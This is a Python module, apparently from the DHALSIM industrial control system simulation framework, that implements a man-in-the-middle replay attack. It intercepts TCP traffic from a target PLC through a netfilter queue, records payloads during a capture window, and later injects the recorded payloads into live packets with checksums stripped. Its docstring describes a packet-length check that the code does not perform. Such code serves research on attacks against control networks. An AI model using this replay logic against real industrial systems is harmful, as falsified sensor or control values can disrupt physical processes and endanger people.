from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
import argparse
from pathlib import Path

import os
import sys

from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
import pandas as pd
import numpy as np


class ReplayMiTMNetfilterQueue(PacketQueue):

    def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
        super().__init__(intermediate_yaml_path, yaml_index, queue_number)
        self.captured_pkts = []
        self.captured_packets_pd = pd.DataFrame(columns=['Packet'])

        self.replay_duration = int(self.intermediate_attack['capture_end']) - \
                               int(self.intermediate_attack['capture_start'])

    def capture(self, packet):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 102, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        :param packet: The captured packet.
        """
        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                if p[IP].src == self.intermediate_attack['public_ip']:
                    self.logger.debug('Targeting IP: ' + self.intermediate_attack['public_ip'] +
                                      'of target ' + str(self.intermediate_attack['target']))

                    current_clock = int(self.get_master_clock())

                    # Capture phase
                    if int(self.intermediate_attack['capture_start']) <= current_clock < \
                            int(self.intermediate_attack['capture_end']):
                        self.captured_packets_pd.loc[current_clock, 'Packet'] = p[Raw]
                        self.logger.debug('Captured packet: at ' + str(current_clock))

                    # Replay phase
                    if int(self.intermediate_attack['replay_start']) <= current_clock < \
                            int(self.intermediate_attack['replay_start']) + self.replay_duration:
                        self.logger.debug('Replaying payload')
                        replay_position = int(self.intermediate_attack['capture_start']) + current_clock -\
                                          int(self.intermediate_attack['replay_start'])

                        # Maybe we did not captured a value for that tag at that iteration
                        if replay_position in self.captured_packets_pd.index and \
                                (not np.isnan(self.captured_packets_pd.loc[replay_position]['Packet'])):
                            validated_replay_position = replay_position
                        else:
                            # todo: There could be a case where the index exists, but the value is Nan
                            validated_replay_position = min(self.captured_packets_pd.index,
                                                            key=lambda x: abs(x - replay_position))

                        del p[IP].chksum
                        del p[TCP].chksum
                        p[Raw] = self.captured_packets_pd.loc[validated_replay_position]['Packet']

                        self.logger.debug(f"Packet replayed for {p[IP].dst}.")

            packet.accept()
        except Exception as exc:
            print(exc)
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")
    parser.add_argument(dest="number", help="Number of que queue configured in IP Tables",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = ReplayMiTMNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number)
    attack.main_loop()

